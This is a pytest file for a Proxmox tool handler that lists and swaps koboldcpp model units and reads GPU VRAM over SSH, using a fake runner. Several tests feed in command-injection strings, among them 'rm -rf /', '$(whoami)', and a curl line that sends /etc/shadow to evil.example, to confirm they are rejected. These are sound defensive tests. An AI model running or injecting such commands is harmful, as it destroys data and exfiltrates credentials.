"""Unit tests for the Proxmox management tools (DP-262).

No network: a FakeRunner records the argv each tool sends and returns canned
results, so we assert on the exact commands + the disabled/validation guards.
"""

from __future__ import annotations

from typing import List, Sequence

import pytest

from config import global_config
from src.proxmox.handler import ProxmoxToolHandler
from src.proxmox.ssh import SSHError, SSHResult, SSHRunner, _reject_bad_args


#: A realistic `systemctl list-unit-files --type=service --no-legend` body: two
#: koboldcpp model units plus decoys that must never be touched. The decoys are
#: in the DEFAULT listing on purpose — DP-332 made the "disable every other unit"
#: set come off the box instead of out of config, so every test that swaps a
#: model is also a test that the koboldcpp anchoring holds.
DEFAULT_UNIT_FILES = "\n".join([
    "koboldcpp-fable.service            disabled  enabled",
    "koboldcpp-gemma.service            disabled  enabled",
    "koboldcpp.service                  disabled  enabled",  # bare: no <name>
    "koboldcppx-thing.service           disabled  enabled",  # near-miss prefix
    "nginx.service                      enabled   enabled",
    "ssh.service                        enabled   enabled",
])

#: /sys/class/drm on the GPU CT: one card, its connector nodes, the render node.
DEFAULT_DRM = "\n".join(
    ["card1", "card1-DP-1", "card1-DP-2", "card1-Writeback-1", "renderD128", "version"]
)

#: R9700, as measured on the live box: 32 GiB total, a model already resident.
DEFAULT_VRAM = {"card1": (34208743424, 29990813696)}


#: Sentinel for "this test did not override this unit's ExecStart".
_DEFAULT_EXEC_START = object()


class FakeRunner:
    """Stand-in for SSHRunner: records calls, returns queued/canned results."""

    def __init__(
        self,
        result: SSHResult | None = None,
        present_units: set[str] | None = None,
        unit_files: str | None = None,
        drm: str | None = None,
        vram: dict[str, tuple[int, int]] | None = None,
        exec_start: dict[str, str | None] | None = None,
        disable_failures: set[str] | None = None,
    ) -> None:
        self.calls: List[List[str]] = []
        self._result = result or SSHResult(0, "ok-stdout", "")
        # None => every unit's model file "exists"; else only these unit names.
        self._present = present_units
        self._unit_files = DEFAULT_UNIT_FILES if unit_files is None else unit_files
        self._drm = DEFAULT_DRM if drm is None else drm
        # card -> (total_bytes, used_bytes); a card absent here has no mem_info.
        self._vram = DEFAULT_VRAM if vram is None else vram
        # unit -> ExecStart stdout; a value of None makes `systemctl show` fail,
        # which is a different thing from a unit that reports another port.
        self._exec_start = exec_start or {}
        # units whose `disable --now` exits non-zero (the D-Bus wait that
        # PVE_SSH_TIMEOUT cuts short is the realistic cause).
        self._disable_failures = disable_failures or set()

    async def run(self, argv: Sequence[str]) -> SSHResult:
        a = list(argv)
        self.calls.append(a)
        # `systemctl list-unit-files ...` → the canned unit inventory (DP-332).
        if "list-unit-files" in a:
            return SSHResult(0, self._unit_files, "")
        # `systemctl show <unit> --property=ExecStart --value` → synth a line that
        # embeds a --model path derived from the unit name.
        if "show" in a and "--property=ExecStart" in a:
            unit = next((x for x in a if x.endswith(".service")), "u.service")
            override = self._exec_start.get(unit, _DEFAULT_EXEC_START)
            if override is None:
                return SSHResult(1, "", "Failed to get properties: Unit not loaded")
            if override is not _DEFAULT_EXEC_START:
                return SSHResult(0, str(override), "")
            return SSHResult(0, f"argv[]=/opt/kcpp --model /models/{unit}.gguf ;", "")
        # `systemctl disable --now <unit>` → fails for the nominated units.
        if "disable" in a and a[-1] in self._disable_failures:
            return SSHResult(
                1, "", f"Job for {a[-1]} timed out; terminated by signal TERM"
            )
        # `test -f /models/<unit>.gguf` → present per self._present.
        if len(a) >= 2 and a[-2] == "-f":
            unit = a[-1].split("/")[-1][:-5]  # strip ".gguf"
            ok = self._present is None or unit in self._present
            return SSHResult(0 if ok else 1, "", "" if ok else "No such file")
        # `ls /sys/class/drm` → the card + connector nodes (DP-332 gpu_status).
        if a[-2:] == ["ls", "/sys/class/drm"]:
            return SSHResult(0, self._drm, "")
        # `cat <card>/device/mem_info_vram_total <...>_used` → two byte counts.
        if len(a) >= 3 and a[-3] == "cat":
            card = a[-1].split("/")[4]
            values = self._vram.get(card)
            if values is None:
                return SSHResult(1, "", "cat: No such file or directory")
            return SSHResult(0, f"{values[0]}\n{values[1]}", "")
        return self._result


@pytest.fixture
def enabled(monkeypatch):
    monkeypatch.setattr(global_config, "PVE_TOOLS_ENABLED", True)
    monkeypatch.setattr(global_config, "PVE_MODEL_HOST_VMID", "101")
    # No unit map to inject: DP-332 deleted PVE_MODEL_UNITS, and the units come
    # from FakeRunner's canned `list-unit-files` output instead.


# -- disabled guard ----------------------------------------------------------

@pytest.mark.asyncio
async def test_tools_disabled_short_circuit(monkeypatch):
    monkeypatch.setattr(global_config, "PVE_TOOLS_ENABLED", False)
    runner = FakeRunner()
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    for coro in (h._pve_status(), h._reboot_node(), h._list_models(),
                 h._gpu_status(), h._reboot_guest("100", "ct"),
                 h._set_active_model("fable")):
        res = await coro
        assert res["status"] == "error"
        assert "disabled" in res["message"]
    assert runner.calls == []  # never attempted SSH


# -- read tools --------------------------------------------------------------

@pytest.mark.asyncio
async def test_pve_status_runs_three_reads(enabled):
    runner = FakeRunner()
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._pve_status()
    assert res["status"] == "ok"
    assert ["uptime"] in runner.calls
    assert ["pct", "list"] in runner.calls
    assert ["qm", "list"] in runner.calls


@pytest.mark.asyncio
async def test_list_models_reports_active_state(enabled):
    runner = FakeRunner(SSHResult(0, "active", ""))
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._list_models()
    assert res["status"] == "ok"
    names = {m["name"] for m in res["models"]}
    # The decoys in DEFAULT_UNIT_FILES (bare koboldcpp.service, koboldcppx-,
    # nginx, ssh) are not models and must not appear.
    assert names == {"fable", "gemma"}
    assert {m["unit"] for m in res["models"]} == {
        "koboldcpp-fable.service", "koboldcpp-gemma.service",
    }
    # each model queried via `pct exec 101 -- systemctl is-active <unit>`
    assert [
        "pct", "exec", "101", "--", "systemctl", "is-active", "koboldcpp-fable.service",
    ] in runner.calls


# -- DP-332: discovery replaces the PVE_MODEL_UNITS map ------------------------

@pytest.mark.asyncio
async def test_list_models_returns_a_unit_no_config_ever_knew_about(enabled):
    """The whole point: a unit installed on the box since the last deploy is
    listed. Under the old config map this required a human edit + redeploy, so a
    freshly installed model was invisible to set_active_model (DP-265)."""
    runner = FakeRunner(unit_files="koboldcpp-brand-new.service  disabled  enabled")
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._list_models()
    assert res["status"] == "ok"
    assert [m["name"] for m in res["models"]] == ["brand-new"]


@pytest.mark.asyncio
async def test_list_models_omits_a_unit_the_box_no_longer_has(enabled):
    """The other drift direction: a removed unit just stops appearing. Nothing
    to un-configure, so nothing can be left behind."""
    runner = FakeRunner(unit_files="koboldcpp-fable.service  disabled  enabled")
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._list_models()
    assert [m["name"] for m in res["models"]] == ["fable"]


@pytest.mark.asyncio
async def test_list_models_surfaces_a_failed_listing(enabled):
    """A CT that cannot be listed must read as a listing failure, not as a box
    with zero models — "no models installed" would invite a swap attempt."""
    class Failing(FakeRunner):
        async def run(self, argv):
            self.calls.append(list(argv))
            return SSHResult(1, "", "pct: CT 101 is not running")

    runner = Failing()
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._list_models()
    assert res["status"] == "error"
    assert "could not list koboldcpp units" in res["message"]
    assert "not running" in res["message"]
    # Nothing beyond the listing was attempted.
    assert runner.calls == [[
        "pct", "exec", "101", "--", "systemctl", "list-unit-files",
        "--type=service", "--no-legend", "--no-pager",
    ]]


@pytest.mark.asyncio
async def test_discovery_sends_no_glob_over_ssh(enabled):
    """The unit filter is applied in Python, never as `koboldcpp-*.service`:
    ssh._reject_bad_args forbids `*`, so a glob argument would make discovery
    fail closed at the transport. Assert the real guard accepts what we send."""
    runner = FakeRunner()
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    await h._list_models()
    listing = [c for c in runner.calls if "list-unit-files" in c]
    assert listing, "list_models never enumerated units"
    for call in runner.calls:
        _reject_bad_args(call)  # raises SSHError on a metacharacter


# -- write tools -------------------------------------------------------------

@pytest.mark.asyncio
async def test_reboot_node(enabled):
    runner = FakeRunner()
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._reboot_node()
    assert res["status"] == "ok"
    assert runner.calls == [["reboot"]]


@pytest.mark.asyncio
@pytest.mark.parametrize("kind,cli", [("ct", "pct"), ("vm", "qm")])
async def test_guest_actions_pick_correct_cli(enabled, kind, cli):
    runner = FakeRunner()
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    await h._reboot_guest("100", kind)
    await h._start_guest("100", kind)
    await h._stop_guest("100", kind)
    assert runner.calls == [
        [cli, "reboot", "100"], [cli, "start", "100"], [cli, "stop", "100"],
    ]


@pytest.mark.asyncio
async def test_guest_rejects_bad_vmid(enabled):
    runner = FakeRunner()
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._reboot_guest("100; rm -rf /", "ct")
    assert res["status"] == "error"
    assert "integer" in res["message"]
    assert runner.calls == []


@pytest.mark.asyncio
async def test_guest_rejects_bad_kind(enabled):
    runner = FakeRunner()
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._reboot_guest("100", "container")
    assert res["status"] == "error"
    assert runner.calls == []


@pytest.mark.asyncio
async def test_set_active_model_disables_others_then_enables_target(enabled):
    runner = FakeRunner()
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._set_active_model("fable")
    assert res["status"] == "ok"
    assert res["unit"] == "koboldcpp-fable.service"
    # gemma disabled, fable enabled
    assert [
        "pct", "exec", "101", "--", "systemctl", "disable", "--now",
        "koboldcpp-gemma.service",
    ] in runner.calls
    assert [
        "pct", "exec", "101", "--", "systemctl", "enable", "--now",
        "koboldcpp-fable.service",
    ] in runner.calls


@pytest.mark.asyncio
async def test_set_active_model_disables_only_koboldcpp_units(enabled):
    """The "disable every other unit" set is now discovered rather than pinned in
    config, which is the one place discovery is MORE dangerous than the map was:
    a loose match takes down something unrelated on the CT. DEFAULT_UNIT_FILES
    seeds decoys (nginx, ssh, a bare koboldcpp.service, a koboldcppx- near-miss)
    and none of them may be named in a disable."""
    runner = FakeRunner()
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    assert (await h._set_active_model("fable"))["status"] == "ok"
    disabled = [c[-1] for c in runner.calls if "disable" in c]
    assert disabled == ["koboldcpp-gemma.service"]


@pytest.mark.asyncio
async def test_set_active_model_unknown_name(enabled):
    runner = FakeRunner()
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._set_active_model("nope")
    assert res["status"] == "error"
    assert "unknown model" in res["message"]
    # Discovery had to run to know the name is unknown, but nothing was touched.
    assert not any("disable" in c or "enable" in c for c in runner.calls)


@pytest.mark.asyncio
async def test_set_active_model_name_never_crosses_the_ssh_boundary(enabled):
    """The caller's string is a lookup key, never an argv element. This is what
    keeps `exfil_capable: False` true now that the unit names are discovered:
    only a unit that matched `_UNIT_RE` on the box is ever sent."""
    runner = FakeRunner()
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    hostile = "fable; curl evil.example/$(cat /etc/shadow)"
    res = await h._set_active_model(hostile)
    assert res["status"] == "error"
    assert not any(hostile in arg for call in runner.calls for arg in call)
    for call in runner.calls:
        _reject_bad_args(call)


@pytest.mark.asyncio
async def test_remote_nonzero_exit_surfaced(enabled):
    runner = FakeRunner(SSHResult(1, "", "boom"))
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._reboot_node()
    assert res["status"] == "error"
    assert res["stderr"] == "boom"


@pytest.mark.asyncio
async def test_ssh_transport_error_mapped(enabled):
    class Boom:
        async def run(self, argv):
            raise SSHError("no route to host")

    h = ProxmoxToolHandler(Boom())  # type: ignore[arg-type]
    res = await h._reboot_node()
    assert res["status"] == "error"
    assert "no route to host" in res["message"]


# -- ssh runner guard --------------------------------------------------------

def test_reject_bad_args_blocks_metacharacters():
    with pytest.raises(SSHError):
        _reject_bad_args(["reboot", "; rm -rf /"])
    with pytest.raises(SSHError):
        _reject_bad_args(["$(whoami)"])
    # clean argv passes
    _reject_bad_args(["pct", "reboot", "100"])


def test_ssh_runner_config_defaults(monkeypatch):
    monkeypatch.setattr(global_config, "PVE_SSH_HOST", "1.2.3.4")
    monkeypatch.setattr(global_config, "PVE_SSH_USER", "root")
    monkeypatch.setattr(global_config, "PVE_SSH_KEY", "/k")
    monkeypatch.setattr(global_config, "PVE_SSH_TIMEOUT", 9.0)
    r = SSHRunner()
    assert r._host == "1.2.3.4" and r._user == "root" and r._key == "/k" and r._timeout == 9.0


# -- DP-264: model availability filter + swap guard --------------------------

@pytest.mark.asyncio
async def test_list_models_omits_units_with_missing_model_file(enabled):
    """Only units whose gguf is on disk are listed (koboldcpp present, gemma not)."""
    runner = FakeRunner(present_units={"koboldcpp-fable.service"})
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._list_models()
    assert res["status"] == "ok"
    names = {m["name"] for m in res["models"]}
    assert names == {"fable"}  # gemma omitted (no file)


@pytest.mark.asyncio
async def test_set_active_model_refuses_when_target_file_missing(enabled):
    """Swap to a unit with no gguf is refused; current model left untouched
    (no disable/enable issued)."""
    # target for "fable" is koboldcpp-fable.service; mark only gemma present.
    runner = FakeRunner(present_units={"koboldcpp-gemma.service"})
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._set_active_model("fable")
    assert res["status"] == "error"
    assert "not on disk" in res["message"]
    # crucially: nothing was disabled or enabled
    assert not any("disable" in c or "enable" in c for c in runner.calls)


# -- DP-332: gpu_status ------------------------------------------------------

@pytest.mark.asyncio
async def test_gpu_status_reads_vram_from_the_discovered_card(enabled):
    """The card index is discovered, not assumed: the live box exposes card1,
    so a hardcoded card0 reads a path that does not exist. The connector nodes
    (card1-DP-1) and renderD128 sitting beside it are not cards."""
    runner = FakeRunner()
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._gpu_status()
    assert res["status"] == "ok"
    assert res["host_vmid"] == "101"
    assert res["gpus"] == [{
        "card": "card1",
        "vram_total_mib": 32624,
        "vram_used_mib": 28601,
        "vram_free_mib": 4022,
    }]
    assert "errors" not in res
    assert ["pct", "exec", "101", "--", "ls", "/sys/class/drm"] in runner.calls


@pytest.mark.asyncio
async def test_gpu_status_reports_no_card_rather_than_guessing(enabled):
    runner = FakeRunner(drm="renderD128\nversion")
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._gpu_status()
    assert res["status"] == "error"
    assert "no DRM card" in res["message"]


@pytest.mark.asyncio
async def test_gpu_status_reports_an_unreadable_card_without_hiding_the_others(enabled):
    """A second, non-amdgpu card has no mem_info_vram_* — that must be reported
    beside the card we care about, not turned into a failed call."""
    runner = FakeRunner(drm="card0\ncard1", vram=DEFAULT_VRAM)
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._gpu_status()
    assert res["status"] == "ok"
    assert [g["card"] for g in res["gpus"]] == ["card1"]
    assert any("card0" in e for e in res["errors"])


@pytest.mark.asyncio
async def test_gpu_status_errors_when_no_card_is_readable(enabled):
    runner = FakeRunner(drm="card0", vram={})
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._gpu_status()
    assert res["status"] == "error"
    assert "no VRAM readable" in res["message"]


@pytest.mark.asyncio
async def test_gpu_status_never_raises_when_the_ct_is_unreachable(enabled):
    class Boom:
        async def run(self, argv):
            raise SSHError("no route to host")

    h = ProxmoxToolHandler(Boom())  # type: ignore[arg-type]
    res = await h._gpu_status()
    assert res["status"] == "error"
    assert "no route to host" in res["message"]


# -- DP-332: what may be disabled, and what a failed disable means ------------
#
# Discovery made the disable set come off the box, which opened two holes the
# config map had closed by construction: the set can now contain units that have
# nothing to do with :5001, and it is no longer small enough to eyeball. Both
# end in the same place as DP-329 — a swap that reports ok while the previous
# model is still the one answering.

@pytest.mark.asyncio
async def test_set_active_model_aborts_when_a_disable_fails(enabled):
    """`systemctl disable --now` over `pct exec` can sit on a D-Bus job past
    PVE_SSH_TIMEOUT and get SIGTERM'd. The unit then keeps :5001 — but
    `enable --now` on a Type=simple target still exits 0, because "started" is
    not "bound". Ignoring the disable's result therefore reports a swap that did
    not happen, which is exactly the DP-329 failure. Abort before the enable."""
    runner = FakeRunner(disable_failures={"koboldcpp-gemma.service"})
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._set_active_model("fable")
    assert res["status"] == "error"
    assert "koboldcpp-gemma.service" in res["message"]
    # The target was never enabled: :5001 is left with whatever holds it, and
    # the caller is told rather than being handed a false "active_model".
    assert not any("enable" in c for c in runner.calls)


@pytest.mark.asyncio
async def test_set_active_model_leaves_a_unit_on_another_port_alone(enabled):
    """`_UNIT_RE` bounds the set to koboldcpp units, but that was never the
    dangerous half: a *genuine* koboldcpp unit serving something else on another
    port — an embedding or draft server — matches the pattern perfectly. The
    config map could not name one; discovery can, and `list_models` does not
    show it, so disabling it would be an invisible side effect of every swap."""
    runner = FakeRunner(
        unit_files="\n".join([
            "koboldcpp-fable.service   disabled  enabled",
            "koboldcpp-gemma.service   disabled  enabled",
            "koboldcpp-embed.service   enabled   enabled",
        ]),
        exec_start={
            "koboldcpp-embed.service": (
                "argv[]=/opt/kcpp --model /models/koboldcpp-embed.service.gguf "
                "--port 5002 ;"
            ),
        },
    )
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    assert (await h._set_active_model("fable"))["status"] == "ok"
    assert [c[-1] for c in runner.calls if "disable" in c] == [
        "koboldcpp-gemma.service"
    ]


@pytest.mark.asyncio
async def test_list_models_omits_a_unit_on_another_port(enabled):
    """The same set seen from the read side. `list_models` has to publish
    exactly what `set_active_model` can switch to — a name in one and not the
    other is what sends the model at a swap that then fails a pre-flight."""
    runner = FakeRunner(
        unit_files="\n".join([
            "koboldcpp-fable.service   disabled  enabled",
            "koboldcpp-embed.service   enabled   enabled",
        ]),
        exec_start={
            "koboldcpp-embed.service": (
                "argv[]=/opt/kcpp --model /models/koboldcpp-embed.service.gguf "
                "--port 5002 ;"
            ),
        },
    )
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._list_models()
    assert [m["name"] for m in res["models"]] == ["fable"]


@pytest.mark.asyncio
async def test_a_unit_with_no_port_flag_still_counts_as_holding_5001(enabled):
    """koboldcpp's own default is 5001, so "no --port" means "contends", not
    "harmless" — the common case, since that is what the units on the box do."""
    runner = FakeRunner(
        exec_start={
            "koboldcpp-gemma.service": (
                "argv[]=/opt/kcpp --model /models/koboldcpp-gemma.service.gguf ;"
            ),
        },
    )
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    assert (await h._set_active_model("fable"))["status"] == "ok"
    assert [c[-1] for c in runner.calls if "disable" in c] == [
        "koboldcpp-gemma.service"
    ]


@pytest.mark.asyncio
async def test_set_active_model_stops_a_unit_it_could_not_read(enabled):
    """An unreadable ExecStart is not evidence of innocence: that unit may be
    the one holding :5001 right now, and skipping it is how a swap "succeeds"
    while the old model keeps answering. Stop it — and say that we guessed."""
    runner = FakeRunner(exec_start={"koboldcpp-gemma.service": None})
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._set_active_model("fable")
    assert res["status"] == "ok"
    assert [c[-1] for c in runner.calls if "disable" in c] == [
        "koboldcpp-gemma.service"
    ]
    assert any("koboldcpp-gemma.service" in w for w in res["warnings"])


@pytest.mark.asyncio
async def test_model_path_accepts_the_equals_form(enabled):
    """systemd echoes ExecStart back verbatim, so a hand-written unit may spell
    it `--model=<path>`. DP-332 tells users a unit they install by hand shows up
    immediately; parsing only the space form reported the gguf as missing and
    refused the swap with a "not on disk" that was not true."""
    runner = FakeRunner(
        unit_files="koboldcpp-fable.service  disabled  enabled",
        exec_start={
            "koboldcpp-fable.service": (
                "argv[]=/opt/kcpp --model=/models/koboldcpp-fable.service.gguf ;"
            ),
        },
    )
    h = ProxmoxToolHandler(runner)  # type: ignore[arg-type]
    res = await h._list_models()
    assert [m["name"] for m in res["models"]] == ["fable"]
    assert (await h._set_active_model("fable"))["status"] == "ok"
